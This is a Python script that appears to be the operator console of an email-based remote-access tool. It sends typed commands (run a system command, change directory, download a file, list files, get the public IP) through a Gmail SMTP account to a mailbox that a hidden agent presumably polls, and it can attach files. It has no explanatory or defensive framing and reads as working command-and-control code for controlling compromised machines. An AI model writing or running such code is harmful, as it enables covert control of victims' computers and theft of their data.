import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import base64
import socket
import os

subject='command'
userName='Email_Address'
password='Email_Password'
def send(subject,message,fileName=""):
    msg = MIMEMultipart()
    msg['From'] = userName
    msg['To'] = userName
    msg['Subject'] = subject
    body = message
    msg.attach(MIMEText(body,'plain'))
    if len(fileName)>0:
        attachment=open(fileName,'rb')
        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',"attachment; filename= "+fileName)
        msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.ehlo()
    server.starttls()
    server.login(userName,password)
    server.sendmail(userName,userName,text)
    server.quit()


while True:
    print ('''
        +system: command
        +goto: path
        +download: fileName
        +listdir
        +getcwd
        +getPubIp
        +EXIT+
    ''')
    command=input("Enter your command: ")
    send(subject,command)
